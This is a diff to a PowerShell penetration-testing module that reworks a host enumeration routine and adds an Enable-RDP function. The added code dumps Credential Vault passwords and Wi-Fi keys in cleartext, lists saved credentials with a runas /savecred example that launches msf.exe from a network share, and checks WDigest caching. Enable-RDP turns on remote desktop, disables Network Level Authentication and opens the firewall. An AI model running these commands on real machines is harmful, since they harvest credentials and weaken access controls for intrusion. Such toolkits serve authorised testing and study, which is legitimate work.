@@ -640,87 +640,6 @@ Function Get-InitialEnum {
 BEGIN
 {
 
-    Function Show-KerberosTokenPermissions {
-    [CmdletBinding()]
-        param()
-
-    $Token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-
-    ForEach ($SID in $GroupSIDs)
-    {
-
-        Try
-        {
-
-            Write-Host (($sid).Translate([System.Security.Principal.NTAccount]))
-
-        }  # End Try
-        Catch
-        {
-
-            Write-Warning ("Could not translate " + $SID.Value + ". Reason: " + $_.Exception.Message)
-
-        }  # End Catch
-    }
-
-    $Token
-
-}  # End Function Show-KerberosTokenPermissions
-
-
-    Function Get-Driver {
-        [CmdletBinding()]
-            Param (
-                [Switch]$Unsigned,
-                [Switch]$Signed,
-                [Switch]$All)  # End param
-    BEGIN
-    {
-
-        Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"
-
-    } # End of Begin section
-    PROCESS
-    {
-
-        If ($Signed)
-        {
-
-            Write-Verbose "Obtaining signed driver info..."
-            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"
-
-            $DrvSig
-            "`n " + $DrvSig.count + " signed drivers, note TRUE column"
-
-        }  # End of If
-        ElseIf ($UnSigned)
-        {
-
-            Write-Verbose "Obtaining signed driver info..."
-            $DrvU = DriverQuery -SI | Select-String "False"
-
-            $DrvU
-            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"
-
-        }  # End ElseIf
-        ElseIf ($All)
-        {
-
-            DriverQuery -SI
-
-        }  # End ElseIf
-        Else
-        {
-
-            DriverQuery
-
-        }  # End Else
-
-    } # End PROCESS
-
-    } # End Function Get-Driver
-
-
     Function Get-AntiVirusProduct {
         [CmdletBinding()]
             param (
@@ -777,108 +696,150 @@ PROCESS
 #================================================================
 #  SECURITY PATCHES
 #================================================================
-    Write-Host "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" 
     Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
 
-    Write-Host "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" -ForegroundColor "Yellow"
-    Try
+    Write-Output "=================================`n|      DOMAIN INFORMATION      |`n================================="
+    $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+    $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry
+    $DCs = $DomainObj.DomainControllers
+    $PDC = $DomainObj.Parent.PdcRoleOwner
+
+    If ($Domain) { Write-Output "DOMAIN: $Domain"}
+    If ($DCs) { Write-Output "DOMAIN CONTROLLERS`n--------------------------"}
+    $DCs 
+    If ($PDC) { Write-Output "PRIMARY DC: $PDC"}
+
+    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" 
+    Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering'
+
+    $WDigestCaching = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest").UseLogonCredential
+    Switch ($WDigestCaching)
     {
 
-        Get-Hotfix -Description "Security Update"
+        '0' {Write-Output "[*] WDigest Caching is disabled"}
 
-    }  # End Try
-    Catch
-    {
+        '1' {Write-Output "[*] WDigest caching is enabled!"}
 
-        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering' | Select-Object -Property HotFixID
+        $Null {Write-Output "[*] WDigest caching is enabled!"}
 
-    }  # End Catch
+    }  # End Switch
 
 #===================================================================
 #  NETWORK SHARES AND DRIVES
 #===================================================================
-Write-Host "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" -ForegroundColor "Yellow"
-Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSystem" } | Format-Table -AutoSize
-
+Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" 
+Get-CimInstance -ClassName Win32_Share
 
 #===================================================================
 #  FIND UNSIGNED DRIVERS
 #===================================================================
 
-    Get-Driver -Unsigned
+    Write-Output "UNSIGNED DRIVERS`n--------------------------------------------"
+    cmd /c 'DriverQuery -SI' | Select-String "False"
 
 #===================================================================
 #  FIND SIGNED DRIVERS
 #===================================================================
-
-    Get-Driver -Signed
+    Write-Output "SIGNED DRIVERS`n--------------------------------------------"
+    cmd /c 'DriverQuery -SI' | Select-String -Pattern "True"
 
 #==========================================================================
 #  ANTIVIRUS APPLICATION INFORMATION
 #==========================================================================
-    Write-Host "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" -ForegroundColor "Yellow"
-
+    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" 
     Get-AntiVirusProduct
 
 #==========================================================================
 #  USER, USER PRIVILEDGES, AND GROUP INFO
 #==========================================================================
-    Write-Host "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" 
     Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"
 
-    Write-Host "=================================`n|       USER & GROUP LIST       |`n=================================" -ForegroundColor "Yellow"
-    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
-    Get-LocalGroup | Format-Table -Property "Name"
 
-    Write-Host "=================================`n|  CURRENT USER PRIVS   |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|       USERS LIST       |`n================================="
+    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
+
+
+    Write-Output "=================================`n|       GROUPS LIST       |`n=================================" 
+    Get-CimInstance -ClassName "Win32_GroupUser" | Format-Table -AutoSize
+
+
+    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n=================================" 
     whoami /priv
 
-    Write-Host "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" 
     Get-ChildItem -Path C:\Users | Select-Object -Property "Name"
 
-    Write-Host "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" 
     Get-Clipboard
 
-    Write-Host "=================================`n|  SAVED CREDENTIALS  |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n=================================" 
     cmdkey /list
-    Write-Host "If you find a saved credential it can be used issuing a command in the below format: "
-    Write-Host 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
+    Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
+    Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
 
-    Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
-    qwinsta
+    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object -TypeName Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
 
 
-    Write-Host "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" -ForegroundColor "Yellow"
-    Show-KerberosTokenPermissions
+    Write-Output "=================================`n|  SIGNED IN USERS  |`n=================================" 
+    Get-CimInstance -ClassName Win32_LoggedOnUser
+
+
+    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" 
+    [System.Security.Principal.WindowsIdentity]::GetCurrent()
 
 #==========================================================================
 #  NETWORK INFORMATION
 #==========================================================================
-    Write-Host "=================================`n|   LISTENING PORTS   |`n=================================" -ForegroundColor "Yellow"
-    Get-NetTcpConnection -State "Listen" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize
+    Write-Output "=================================`n|   LISTENING PORTS   |`n================================="
+    Get-CimInstance -Class Win32_SerialPort | Select-Object -Property Name, Description, DeviceID
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
+    $Connections = $TCPProperties.GetActiveTcpListeners()
+    ForEach ($Connection in $Connections)
+    {
+        If ($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }
+        $OutputObj = New-Object -TypeName PSobject -Property @{LocalAddress=$Connection.Address; ListeningPort=$Connection.Port; AddressType=$IPType}
+        $OutputObj
 
-    Write-Host "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" -ForegroundColor "Yellow"
-    Get-NetTcpConnection -State "Established" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize
+    }  # End ForEach
 
-    Write-Host "=================================`n|  DNS SERVERS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS  |`n================================="
+    $OutputObj = @()
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
+    $Connections = $TCPProperties.GetActiveTcpConnections()            
+    ForEach ($Connection in $Connections) 
+    {
+
+        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }            
+        $OutputObj += New-Object -TypeName PSObject -Property @{LocalAddress=$Connection.LocalEndPoint.Address; LocalPort=$Connection.LocalEndPoint.Port; RemoteAddress=$Connection.RemoteEndPoint.Address; RemotePort=$Connection.RemoteEndPoint.Port; State=$Connection.State; AddressType=$IPType}
+
+    }  # End ForEach
+    $OutputObj | Format-Table -AutoSize
+
+    Write-Output "=================================`n|  DNS SERVERS  |`n=================================" 
     Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  ROUTING TABLE  |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n|  ROUTING TABLE  |`n=================================" 
     Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" 
     Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  Wi-Fi Passwords  |`n=================================" -ForegroundColor "Yellow"
+
+    Write-Output "=================================`n|  Wi-Fi Passwords  |`n=================================" 
     (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 
 #==========================================================================
 #  APPLICATION INFO
 #==========================================================================
-    Write-Host "=================================`n| INSTALLED APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
-
+    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n=================================" 
     $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
-
     ForEach ($Path in $Paths)
     {
 
@@ -886,14 +847,14 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 
     }  # End ForEach
 
-    Write-Host "=================================`n| STARTUP APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| STARTUP APPLICATIONS |`n=================================" 
     Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize
 
     $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
     If ($StartupAppCurrentUser)
     {
 
-        Write-Host "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"
+        Write-Output "$StartupAppCurrentUser automatically starts for $env:USERNAME"
 
     }  # End If
 
@@ -901,11 +862,13 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     If ($StartupAppAllUsers)
     {
 
-        Write-Host "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"
+        Write-Output "$StartupAppAllUsers automatically starts for All Users"
 
     }  # End If
 
-    Write-Host "Check below values for binaries you may be able to execute as another user."
+    Write-Output "============================================================================"
+    Write-Output "Check below values for binaries you may be able to execute as another user."
+    Write-Output "============================================================================"
     Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
     Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
     Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -915,11 +878,29 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 #==========================================================================
 #  PROCESS AND SERVICE ENUMERATION
 #==========================================================================
-    Write-Host "=================================`n|  PROCESS ENUMERATION  |`n=================================" -ForegroundColor "Yellow"
-    Get-WmiObject -Query "Select * from Win32_Process" | Where-Object { $_.Name -notlike "svchost*" } | Select-Object -Property "Name","Handle",@{Label="Owner";Expression={$_.GetOwner().User}} | Format-Table -AutoSize
+    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n=================================" 
+    Get-Process -IncludeUserName | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" -ForegroundColor "Yellow"
-    Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"
+
+    Write-Output "=================================`n|  SERVICE ENUMERATION  |`n=================================" 
+    Get-cimInstance -ClassName Win32_Service
+
+
+    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" 
+    [Environment]::GetEnvironmentVariables()
+
+#==========================================================================
+# BROWSER INFO
+#==========================================================================
+    Write-Output "================================`n| BROWSER ENUMERATION |`n==================================="
+    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name "start page" | Select-Object -Property "Start Page"
+
+    $Bookmarks = [Environment]::GetFolderPath('Favorites')
+    Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {
+        
+        Get-Content -Path $_.FullName | Select-String -Pattern URL
+        
+    }  # End ForEach-Object
 
 }  # End PROCESS
 
@@ -4546,3 +4527,56 @@ Function Test-KerberosDoubleHop {
 
 }  # End Function Test-KerberosDoubleHop
 
+<#
+.SYNOPSIS
+This cmdlet is used to allow RDP Connections to a device
+
+
+.DESCRIPTION
+This will enable RDP on the machine and disable Network Level Authentication if specified
+
+
+.EXAMPLE
+Enable-RDP
+
+
+.NOTES
+Author: Robert H. Osborne
+Alias: tobor
+Contact: rosborne@osbornepro.com
+
+
+.LINK
+https://roberthsoborne.com
+https://osbornepro.com
+https://btps-secpack.com
+https://github.com/tobor88
+https://gitlab.com/tobor88
+https://www.powershellgallery.com/profiles/tobor
+https://www.linkedin.com/in/roberthosborne/
+https://www.youracclaim.com/users/roberthosborne/badges
+https://www.hackthebox.eu/profile/52286
+
+
+.INPUTS
+None
+
+
+.OUTPUTS
+None
+#>
+Function Enable-RDP {
+    [CmdletBinding()]
+        param()
+
+    Write-Verbose "Enabling RDP on $env:COMPUTERNAME"
+    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+
+    Write-Verbose "Disabling NLA on $env:COMPUTERNAME"
+    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Force | Out-Null
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value "00000000" -PropertyType DWORD -Force
+
+    Write-Verbose "Enabling RDP Firewall rule"
+    Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
+
+}  # End Function Enable-RDP
